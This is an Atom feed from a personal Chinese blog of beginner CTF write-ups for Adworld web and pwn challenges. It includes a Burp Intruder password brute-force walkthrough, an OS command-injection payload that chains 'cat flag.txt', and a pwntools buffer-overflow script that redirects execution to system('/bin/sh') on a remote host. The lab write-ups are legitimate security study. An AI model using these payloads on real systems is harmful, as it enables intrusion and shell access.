<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoxiaoxy</title>
  
  
  <link href="http://xiaoxiaoxy1.github.io/atom.xml" rel="self"/>
  
  <link href="http://xiaoxiaoxy1.github.io/"/>
  <updated>2022-01-20T22:39:49.147Z</updated>
  <id>http://xiaoxiaoxy1.github.io/</id>
  
  <author>
    <name>xiaoxiaoxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界-Web</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/</id>
    <published>2022-01-17T14:58:59.000Z</published>
    <updated>2022-01-20T22:39:49.147Z</updated>
    
    <content type="html"><![CDATA[<br/><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>右键点击查看网页源代码不可用</p><p>F12、ctrl+u、地址栏前面加上view-source查看网页源代码</p><p>view-source:URL</p><p><br/><br/></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>网页爬虫robots协议，地址栏后加  /robots.txt  即可查看爬虫可检测的资源数据</p><p>URL/robots.txt</p><p><br/><br/></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>常见的六种备忘文件格式 .git .svn .swp .~ .bak .bash_history</p><p>URL/index.php.bak</p><p><br/><br/></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>之前想用Brup Suite抓包，但是捣鼓了半天没弄好，只能换Wireshark来抓包</p><p>Brup Suite下载：（自己去找）</p><p>（Brup Suite帮助文档：<a href="https://t0data.gitbooks.io/burpsuite%EF%BC%89">https://t0data.gitbooks.io/burpsuite）</a></p><p>Wireshark下载&amp;安装：<a href="https://blog.csdn.net/Qi2456/article/details/95033886">https://blog.csdn.net/Qi2456/article/details/95033886</a></p><p>Wireshark使用速成：<a href="https://b23.tv/nFBRoYS">https://b23.tv/nFBRoYS</a></p><br/><p>有了以上基础，这里就直接给图了：</p><p>看IP地址选择数据包，查看到以下字段</p><p><img src="image-20220118165024826.png" alt="image-20220118165024826"></p><p>url后添加  /cookie.php  获取指定资源:</p><p><img src="image-20220118165258439.png" alt="image-20220118165258439"></p><p>返回这一界面（See the http response：查看服务器响应报文）：</p><p><img src="image-20220118165356266.png" alt="image-20220118165356266"></p><p>查看Wireshark，发现捕捉到有关/cookie.php的数据包</p><p><img src="image-20220118165603028.png" alt="image-20220118165603028"></p><p>右键点击，查看TCP流：</p><p><img src="image-20220118165724094.png" alt="image-20220118165724094"></p><p>拿到flag：</p><p><img src="image-20220118165800464.png" alt="image-20220118165800464"></p><br/><p>另外，由浏览器的自带开发工具也可以解这道题：</p><p>首先，F12打开控制台，按以下图片操作：</p><p><img src="image-20220118170132006.png" alt="image-20220118170132006"></p><p><img src="image-20220118170341396.png" alt="image-20220118170341396"></p><p>它叫我们看cookie.php，那我们就看呗，地址栏写入相应资源：</p><p><img src="image-20220118170455065.png" alt="image-20220118170455065"></p><p><img src="image-20220118170532433.png" alt="image-20220118170532433"></p><p>进入查看，找到flag：</p><p><img src="image-20220118170747113.png" alt="image-20220118170747113"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;17adcb29931a37eedfd9b45d4573af98&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>F12,删除disabled再按按钮即可</p><p><img src="image-20220118193027278.png" alt="image-20220118193027278"></p><p><br/><br/></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>随机输入账户、密码登录，发现提示以用户名admin登录（密码未提示）：</p><p><img src="image-20220118212332148.png" alt="image-20220118212332148"></p><br/><p>接下来利用Brup Suite，创建网页：</p><p><img src="image-20220121062058553.png" alt="image-20220121062058553"></p><p>地址栏输入题目给的IP地址（显示加载中，进Brup点forward即可显示）：</p><p><img src="image-20220121062630832.png" alt="image-20220121062630832"></p><p><img src="image-20220121062732420.png" alt="image-20220121062732420"></p><br/><p>输入用户admin（），密码123，回车：</p><p><img src="image-20220118211507617.png" alt="image-20220118211507617"></p><p>返回Brup Suite抓包，抓到如下包：</p><p><img src="image-20220118211439592.png" alt="image-20220118211439592"></p><p>点击Forward抓包，前往HTTP history查看，找到刚刚对应的包：</p><p><img src="image-20220118211840368.png" alt="image-20220118211840368"></p><p>右键Send to Intruder（实施密码爆破），前往Intruder查看：</p><p><img src="image-20220118212014731.png" alt="image-20220118212014731"></p><p>将admin 两端的 $ 符号去掉，因为用户名admin已知是正确的，不需要爆破：</p><p><img src="image-20220118213828075.png" alt="image-20220118213828075"></p><p>点进Payloads，点击Load写好以下字典txt（密码：123456，提前知道的，这里就随便写几组，重要的是熟悉用法流程），并装载至Payload Options</p><p><img src="image-20220118210913233.png" alt="image-20220118210913233"></p><p><img src="image-20220118214025101.png" alt="image-20220118214025101"></p><p>最后点击右上侧的Start attack键即可开始爆破。</p><p>一个一个地看响应（Response），发现密码为123456时得到flag</p><p><img src="image-20220118210653461.png" alt="image-20220118210653461"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;fcfc4fd91884d261c2bb7f0f115abce1&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>PHP基本语法：（自己去学）</p><p>Get传参：URL//?a=00a&amp;&amp;b=12345s</p><p><br/><br/></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>get简单的说就是直接在url后面添加参数<br>post需要在http包里面添加参数或者在Firefox的hackbar里面可以直接添加参数</p><p>GET：URL/?a=1</p><p>POST：hackbar</p><p>———↑ 废话 ——–</p><br/><p>（本来打算自己用Brup Suite通过拦截/构造请求报文做这道题的，最后还是用了hackbar插件）搜了诸多资料后，了解到GET请求方式将请求数据放在了HTTP协议头＜request-line＞中，POST请求把提交的数据放置在HTTP包的包体＜request-body＞中，然后我就去构造请求报文，尝试了半天都没弄出来，一气之下便打开火狐下载hackbar插件，借助Wireshark抓包将三组请求数据报文抓出来一一对比，看完之后本人就无语了……。</p><p>贴个链接：<a href="https://www.cnblogs.com/biyeymyhjob/archive/2012/07/28/2612910.html">HTTP请求报文和HTTP响应报文 - as_ - 博客园 (cnblogs.com)</a></p><p>再贴一个：<a href="https://www.csdn.net/tags/NtTacg2sODkwNDEtYmxvZwO0O0OO0O0O.html"> 以post方式随便提交一个名为b的变量 - CSDN</a></p><p>链接：<a href="https://blog.csdn.net/liuno0/article/details/100542194"> Burpsuite拦截并修改request/response_liuno0的博客-CSDN博客_burp如何修改response</a></p><p>hackbar下载：<a href="https://blog.csdn.net/Drifter_Galaxy/article/details/118692054">hackbar2.1.3 安装教程（附下载地址 ）Firefox &amp; Chrome_coderge的博客-CSDN博客_hackbar</a></p><br/><p>解题过程：</p><p>火狐安装hackbar插件，F12：</p><p><img src="image-20220119160004865.png" alt="image-20220119160004865"></p><p>解题完毕。</p><br/><p>拓展：</p><p>以上操作过程全程Wireshark监控（无参发送一次、GET请求一次、GET加POST请求一次），抓到以下三个包，无参请求、Get请求、POST请求：</p><p><img src="image-20220119160141262.png" alt="image-20220119160141262"></p><p>对比无参请求、Get参数请求、Post参数请求：</p><p><img src="image-20220119160215794.png" alt="image-20220119160215794"></p><p>将第三张图片的POST请求报文粘贴至Brup Suite查看效果：</p><p><img src="image-20220119160313717.png" alt="image-20220119160313717"></p><p>响应报文中出现flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;b30d28348d309b6e811d82eb7baa91d3&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>链接：<a href="https://blog.csdn.net/qq_41617034/article/details/91802623">https://blog.csdn.net/qq_41617034/article/details/91802623</a></p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.123.123.123</span><br><span class="line">Referer:https://www.google.com</span><br></pre></td></tr></table></figure><p>注：请求报文中插入XFF后，最后一行数据需空两行才能成功</p><br/><br/><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>菜刀：<a href="https://blog.csdn.net/silence1_/article/details/89672553">https://blog.csdn.net/silence1_/article/details/89672553</a></p><p>蚁剑：<a href="https://blog.csdn.net/weixin_43545225/article/details/120255025">https://blog.csdn.net/weixin_43545225/article/details/120255025</a></p><p>蚁剑下载：<a href="https://blog.csdn.net/weixin_42474304/article/details/116376746">中国蚁剑(antSword)下载、安装、使用教程_CTF的博客-CSDN博客_中国蚁剑</a></p><p><img src="image-20220121040951156.png" alt="image-20220121040951156"></p><p><img src="image-20220121040917664.png" alt="image-20220121040917664"></p><p><img src="image-20220121041514296.png" alt="image-20220121041514296"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;8f03eb815046d74a3bfedc206628512c&#125;</span><br></pre></td></tr></table></figure><br/><br/><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>链接（OS命令注入攻击）：<a href="https://blog.csdn.net/qq_38265137/article/details/101158082">https://blog.csdn.net/qq_38265137/article/details/101158082</a></p><p>链接（《图解HTTP》224页）：<a href="https://blog.csdn.net/AC_greener/article/details/80219609">https://blog.csdn.net/AC_greener/article/details/80219609</a></p><br/><p>输入框输入以下数据即可获取flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home &amp;&amp;cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="image-20220121042741986.png" alt="image-20220121042741986"></p><br/><h5 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;ls</span><br></pre></td></tr></table></figure><p>目的：连续使用多次返回上一级目录，查看根目录所包含的资源（文件、文件夹等统称）情况：</p><p><img src="image-20220121044804580.png" alt="image-20220121044804580"></p><p>查看到有home目录的存在，而Linux操作系统中（绝大部分的服务器搭载的都是Linux操作系统）用户使用的目录就默认建立在home目录下，所以我们写出以下指令查看home目录下的资源情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home  &amp;&amp;ls</span><br></pre></td></tr></table></figure><p>ok，flag文档直接就出来了：</p><p><img src="image-20220121045219051.png" alt="image-20220121045219051"></p><p>最后就是开头那样，加一个“cat flag.txt”即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home &amp;&amp;cat flag.txt</span><br></pre></td></tr></table></figure><br/><p>推荐题解：</p><p>链接（手动测试）：<a href="https://blog.csdn.net/zouchengzhi1021/article/details/104074871">https://blog.csdn.net/zouchengzhi1021/article/details/104074871</a></p><p>链接（python脚本）：<a href="https://blog.csdn.net/qq_29566629/article/details/107633755">https://blog.csdn.net/qq_29566629/article/details/107633755</a></p><br/><br/><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>链接（冗）：<a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p><p>链接（修改源码）：<a href="https://blog.csdn.net/qq_40481505/article/details/89929978">https://blog.csdn.net/qq_40481505/article/details/89929978</a></p><p>链接（简）：<a href="https://blog.csdn.net/qq_37872337/article/details/108100275">https://blog.csdn.net/qq_37872337/article/details/108100275</a></p><p>链接（简+明）：<a href="https://www.cnblogs.com/ainv-123/p/11595170.html">攻防世界 simple——js - ainv - 博客园 (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:Cyberpeace&#123;786OsErtk12&#125;</span><br></pre></td></tr></table></figure><br/><br/><p>simple_js暂且过了</p><p><img src="image-20220121060020220.png" alt="image-20220121060020220"></p><p>最近先浅学一下PHP、Css、JavaScript吧，掌握基本语法，做到能看懂代码</p><p><img src="image-20220121061116038.png" alt="image-20220121061116038"></p>]]></content>
    
    
    <summary type="html">新手区(题训)----------------------------之前的博客不看也罢-----------------------------------------------</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>xiaoxiao-Note1</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/11/12/xiaoxiao-Note1/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/11/12/xiaoxiao-Note1/</id>
    <published>2021-11-12T01:33:49.000Z</published>
    <updated>2021-12-11T13:45:46.421Z</updated>
    
    <content type="html"><![CDATA[<p>NX保护  ：<a href="https://blog.csdn.net/weixin_39194641/article/details/101113761">https://blog.csdn.net/weixin_39194641/article/details/101113761</a></p><p>​                   <a href="https://blog.csdn.net/weixin_46711318/article/details/107686188">https://blog.csdn.net/weixin_46711318/article/details/107686188</a></p><p>保护机制：<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a>  *</p><p>C语言函数调用规定：<a href="http://blog.csdn.net/adcxf/article/details/2699323">http://blog.csdn.net/adcxf/article/details/2699323</a>  *</p><p>​                                     <a href="https://blog.csdn.net/hellokandy/article/details/54603055">https://blog.csdn.net/hellokandy/article/details/54603055</a></p><p>kali Linux安装教程：<a href="https://blog.csdn.net/qq_42427971/article/details/112977119">https://blog.csdn.net/qq_42427971/article/details/112977119</a> *</p><p>想抽空看的：<a href="https://www.cnblogs.com/tdyizhen1314/p/4902560.html">https://www.cnblogs.com/tdyizhen1314/p/4902560.html</a></p><p>pwn学习路线：<a href="https://rj45mp.github.io/pwn%E5%AD%A6%E4%B9%A0%E5%8F%91%E5%B1%95%E8%B7%AF%E7%BA%BF/">https://rj45mp.github.io/pwn%E5%AD%A6%E4%B9%A0%E5%8F%91%E5%B1%95%E8%B7%AF%E7%BA%BF/</a> </p><p>​                        <a href="https://www.daimajiaoliu.com/daima/569f0b844656402">https://www.daimajiaoliu.com/daima/569f0b844656402</a> *</p>]]></content>
    
    
    <summary type="html">Some notes</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界-level2</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/11/12/level2/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/11/12/level2/</id>
    <published>2021-11-12T00:43:41.000Z</published>
    <updated>2021-11-12T02:26:25.583Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们看看文件的基本信息以及文件开启的保护机制</p><p><img src="image-20211112084610889.png" alt="image-20211112084610889"></p><p>32位文件&amp;栈不可执行保护（NX保护机制），注：No xxx就是未开启该保护</p><p>接着我们用32位ida打开文件：</p><p><img src="image-20211112085034275.png" alt="image-20211112085034275"></p><p>刚打开就看见了调用system()函数的一个函数，但并没有看见/bin/sh，不管它，我们找到main函数看看：</p><p><img src="image-20211112085550145.png" alt="image-20211112085550145"></p><p>不用多提了吧，跟进vulnerable_function()就完事了：</p><p><img src="image-20211112085710607.png" alt="image-20211112085710607"></p><p>ok 136 字符大小的buf数组，以及读入0x100= 256 个字符的read函数，明显的栈溢出题</p><p>先到这吧，下午再写</p>]]></content>
    
    
    <summary type="html">攻防世界-pwn-level2</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界-level0</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/11/11/level0/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/11/11/level0/</id>
    <published>2021-11-11T04:13:43.000Z</published>
    <updated>2021-11-11T12:23:34.249Z</updated>
    
    <content type="html"><![CDATA[<h5 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h5><p>首先，将附件拖入Linux虚拟机中，查看一些基本信息：</p><p>$ file [文件名]   （查看基本信息）：</p><p><img src="image-20211111132507774.png" alt="image-20211111132507774"></p><p>此处我们只要知道它是64位文件就行</p><p>接着 $ checksec level0   （查看文件开启的保护机制）：</p><p><img src="image-20211111132702011.png" alt="image-20211111132702011"></p><p>这些保护机制是干嘛的自己去百度了解，或者阅读《CTF权威指南》</p><h6 id="转入正题："><a href="#转入正题：" class="headerlink" title="转入正题："></a>转入正题：</h6><p>将附件拖入64位ida，找到main函数：</p><p><img src="image-20211111121543042.png" alt="image-20211111121543042"></p><p>发现只有一个写函数和一个跟在return后面的函数，我们跟进vulnerable_function：</p><p><img src="image-20211111121559745.png" alt="image-20211111121559745"></p><p>发现该函数中定义了一个128字符大小的字符数组，而后面的read函数最多可读入0x200（16进制）= 512 个字符，这也说明了这题是一道栈溢出题</p><p><img src="image-20211111121943642.png" alt="image-20211111121943642"></p><p>接着跟进buf数组，找到return标志“r”，再用buf的起始偏移地址（-80）减去“r”的偏移地址再取绝对值得 ：0x|-80-8|=0x88（0x表示16进制）=  136，也就是在输入136个冗余字符后，再输入的字符覆盖的地址空间就是这个“r”指向的地址空间，只要我们构造好这串接下来输入的字符串，就能依靠这个“r”将程序跳转到我们想要执行任何位置，使程序从跳转到的地址继续开始执行指令</p><p><img src="image-20211111121626092.png" alt="image-20211111121626092"></p><p>此时我们按下Shift+F12转入String window中看看有没有我们想要找的/bin/sh</p><p><img src="image-20211111123918250.png" alt="image-20211111123918250"></p><p>还真有，那我们跟进去看看：</p><p><img src="image-20211111124116865.png" alt="image-20211111124116865"></p><p>继续跟进callsystem+4↑o：</p><p><img src="image-20211111124215771.png" alt="image-20211111124215771"></p><p>F5切换视图，得知/bin/sh存在于callsystem函数当中：</p><p><img src="image-20211111124252498.png" alt="image-20211111124252498"></p><p>拓宽旁边的Functions window，查看callsystem函数的入口地址（起始地址）：</p><p><img src="image-20211111124406342.png" alt="image-20211111124406342"></p><p>ok，入口地址0x00400596，那么我们构造的payload = ‘a’*136+p64（0x00400596）</p><p>因为这是64位文件所以用p64（），注：32位文件一定要用p32（），64位文件一定要用p64（），64位文件用p32（）的话数据前补0不够会错，32位文件用p64（）的话前补0过多也会错，不过我还没实践过</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                               <span class="comment">#导入pwn模块</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;51403&#x27;</span>)          <span class="comment">#远端连接</span></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0000000000400596</span>))  <span class="comment">#发送数据  </span></span><br><span class="line">io.interactive()                                <span class="comment">#接收交互</span></span><br></pre></td></tr></table></figure><h5 id="个人问题："><a href="#个人问题：" class="headerlink" title="个人问题："></a>个人问题：</h5><p>emm…：</p><p><img src="image-20211111131103896.png" alt="image-20211111131103896"></p><p>上次新手赛的时候我就是因为这远端连接不上的问题导致我连那简单pwn的flag都没拿到，浪费了大量的时间，当时我还以为是举办方的服务器出问题了，现在看来是我的个人PC有问题⊙∀⊙！</p><h5 id="2021-11-11-18-06"><a href="#2021-11-11-18-06" class="headerlink" title="2021/11/11 18:06"></a>2021/11/11 18:06</h5><p>ok，重启了下虚拟机我就能连上远端了。。。。。。要是早点知道就好了。。。。。。</p><p>但愿能进校CTF队吧</p><p><img src="image-20211111180900823.png" alt="image-20211111180900823"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;f0ca5da1cdfb6340b7bf05a37ea6a8cc&#125;</span><br></pre></td></tr></table></figure><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><h6 id="xiaoxiao疑惑"><a href="#xiaoxiao疑惑" class="headerlink" title="xiaoxiao疑惑"></a>xiaoxiao疑惑</h6><p><img src="image-20211111182045681.png" alt="image-20211111182045681"></p><p>这里题目的端口号是50416，跟下面的51403不一样是因为每次创建场景的端口号都是随机的，下面的脚本是我在前一个场景下写的，所以端口号是前一个场景的端口号，与这张图的端口号不一样。</p><p><img src="image-20211111181911372.png" alt="image-20211111181911372"></p><p><img src="image-20211111181922023.png" alt="image-20211111181922023"></p><p>为什么我的脚本里没有打开远端服务器level0文件的操作，只是发送了一串payload就拿到了远端服务器的shell？</p><p>解答：在题目创建题目场景的时候，远端服务器已经启动了level0，并把level0的输入输出绑定到了51403端口，所以我用remote从51403端口接入时就已经是在跟level0交互了</p><h6 id="gdb本地调试："><a href="#gdb本地调试：" class="headerlink" title="gdb本地调试："></a>gdb本地调试：</h6><p>gdb打开附件，在main函数和vulnerable_function函数（字符输入）处打下断点：</p><p><img src="image-20211111133656883.png" alt="image-20211111133656883"></p><p><img src="image-20211111133614544.png" alt="image-20211111133614544"></p><p>注，用地址打断点要用 $ break *[16进制地址]</p><p>首先：$ run运行程序，并停止在第一个断点main函数处，但停在这里没什么用</p><p><img src="image-20211111133956141.png" alt="image-20211111133956141"></p><p>我们使用 $ continue 指令使程序运行至下一断点vulnerable_function函数</p><p><img src="image-20211111134431387.png" alt="image-20211111134431387"></p><p>可以发现那里打印出了一个Hello，World，这是我们执行main函数的过程中打印出来的，由下面的反编译代码可知，main函数中有打印Hello，World的语句</p><p><img src="image-20211111134649152.png" alt="image-20211111134649152"></p><p>然后我们单走三步 $ si :</p><p><img src="image-20211111135202455.png" alt="image-20211111135202455"></p><p>code段出现了 &lt; read@plt &gt;，这对应着我们vulnerable_function函数中的read函数的调用</p><p><img src="image-20211111135316303.png" alt="image-20211111135316303"></p><p>接着我们再单走5步 $ si （前4步使指针指向read，第5步进入read）进入read函数查看，此时刚进入read函数：</p><p><img src="image-20211111140118890.png" alt="image-20211111140118890"></p><p>看到此时栈段的初始地址：</p><p><img src="image-20211111140308756.png" alt="image-20211111140308756"></p><p>使用 $ x/136wx 0x7fffffffdf08    从低地址向高地址打印136个内存地址（不标准术语）：</p><p><img src="image-20211111141422227.png" alt="image-20211111141422227"></p><p>记住此时栈的情况，如上↑</p><p>再使用  $ x/180wx 0x7fffffffdf08    多打印一些栈空间存储情况用以与之后做对比：</p><p><img src="image-20211111141759713.png" alt="image-20211111141759713"></p><h6 id="高能预警："><a href="#高能预警：" class="headerlink" title="高能预警："></a>高能预警：</h6><p>接下来，我们返回ida去找到vulnerable_function函数的末尾地址，为什么要找？因为我们现在的指针刚进入read函数，指着read函数的初始地址，但<strong>我们调试的目的是</strong>要输入字符使输入的字符覆盖栈地址空间，然后查看栈情况看覆盖的地址对不对，而此时的指针位置离我们<strong>可输入字符的那条指令</strong>不知道还有多远（因为假如read函数还调用了其他系统函数的话，就会有很多额外指令，我们单走 $ si 不知道要走多少指令，单走一次 $ si 相当于系统执行一条普通指令，计算机执行指令的速度我在百度上搜了一下，1纳秒左右，不知道对不对，就算我们以1秒执行一次$ si 并查看当前指针位置的速度进行，跟1纳秒一条指令相比，差了10^9个数量级，简言之我们一步 $ si 执行一条指令,计算机相同时间内能执行10^9调指令）所以我们直接找到vulnerable_function函数的末尾地址，计算机在断到这个断点之前一定会先执行<strong>可输入字符的那条指令</strong>（这个可输入字符的指令是在vulnerable_function函数调用中出现的，所以我们执行到vulnerable_function函数的末尾一定会执行到这个可输入字符的指令）</p><p>好吧，废话说多了，现在返回ida找末尾地址：</p><p><img src="image-20211111142824910.png" alt="image-20211111142824910"></p><p>因为我们要找末尾地址，所以我们点击return后按下tab键</p><p><img src="image-20211111142227896.png" alt="image-20211111142227896"></p><p>初始位置自动定位在leave处，leave的英文是什么我好像不知道，反正这就是vulnerable_function函数的末尾地址 0x004005C4</p><p><img src="image-20211111142256638.png" alt="image-20211111142256638"></p><p>现在我们再返回gdb下一个断点 $ break *0x004005c4</p><p><img src="image-20211111142558240.png" alt="image-20211111142558240"></p><p>ok，断点下好了，输入continue继续执行：</p><p><img src="image-20211111145430366.png" alt="image-20211111145430366"></p><p>很好，现在可以输入字符了，但我们要输入136个a，太多了，我们可以用python快速得出：</p><p><img src="image-20211111145641439.png" alt="image-20211111145641439"></p><p>将这136个a字符复制过去，按下回车</p><p><img src="image-20211111145852004.png" alt="image-20211111145852004"></p><p>此时我们再执行  $ x/136wx 0x7fffffffdf08 和  $ x/180wx 0x7fffffffdf08</p><p>先是$ x/136wx 0x7fffffffdf08：</p><p><img src="image-20211111150359331.png" alt="image-20211111150359331"></p><p>诶，我去，我还以为这里全部都会被0x61（字符a的ascll码值）填满，分析了一下，一个字符是十进制的1，而我们$ x/136wx 0x7fffffffdf08 中的136是16进制的136，转成10进制是310，可是我拿打印出的最后地址0x7fffffffe118-0x7fffffffdf08 = 0x210 = 528，懵了懵了</p><p><img src="image-20211111151035567.png" alt="image-20211111151035567"></p><p>好奇怪啊，算了这不是重点，这里不纠结了</p><p>把之前的图拿过来对比一下，之前栈里面是没有0x61616161的：</p><p><img src="image-20211111141422227.png" alt="image-20211111141422227"></p><p>我们继续看栈，这个在覆盖了136个a字符的栈后面第一个东西是什么？是0x0040050a，这跟那些函数的起始地址长得很像不是吗，所以这应该就是一个return调用的地址没错了，<em><strong>也就是说我们构造的payload是没有问题的，得到的这个结论就是gdb调试的意义</strong>，我们之前说的payload = ‘a’</em>136+p64（0x00400596），这个0x00400596就是要把这里0x0040050a覆盖掉的新地址，覆盖以后再执行程序，程序执行到这个return，return到0x0040050a，就能进入system函数（system（”/bin/sh“））拿到shell</p><p><img src="image-20211111151348919.png" alt="image-20211111151348919"></p><p>再重新理一遍本题原理：</p><p>1、找到栈溢出函数（本题main() -&gt; vulnerable_function() -&gt; read()）</p><p>2、覆盖buf相距0x88=136个字符的return的返回地址为带有system（”/bin/sh“）的callsystem的首地址0x00400596</p><p><img src="image-20211111153939572.png" alt="image-20211111153939572"></p><p><img src="image-20211111154115024.png" alt="image-20211111154115024"></p><p><img src="image-20211111154230809.png" alt="image-20211111154230809"></p><p>3、写好脚本就行</p><p><img src="image-20211111154428348.png" alt="image-20211111154428348"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                               <span class="comment">#导入pwn模块</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;51403&#x27;</span>)          <span class="comment">#远端连接</span></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0000000000400596</span>))  <span class="comment">#发送数据  </span></span><br><span class="line">io.interactive()                                <span class="comment">#接收交互</span></span><br></pre></td></tr></table></figure><p>写得好累，不过把基础知识打牢了很多，还行吧</p><p>不知道我的文字描述别人看起来感觉怎么样，反正我自己看得有些吃力</p><p>对了，如果发现有错误，欢迎指正（wx：xy1724252720）</p>]]></content>
    
    
    <summary type="html">gdb不会了来这看</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>银行家算法</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/11/07/banker/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/11/07/banker/</id>
    <published>2021-11-07T07:37:42.000Z</published>
    <updated>2021-12-15T13:55:39.684Z</updated>
    
    <content type="html"><![CDATA[<p>感觉自己写得还不错，在这保留一下源代码吧 ^_^</p><p>操作系统书P172</p><p>原理：</p><p>1、占据资源全为0的进程不会造成死锁，做标记</p><p>2、循环判定、做标记&amp;计算</p><p>3、若所有进程都有标记，说明无死锁；反之存在死锁</p><h4 id="简洁版："><a href="#简洁版：" class="headerlink" title="简洁版："></a>简洁版：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 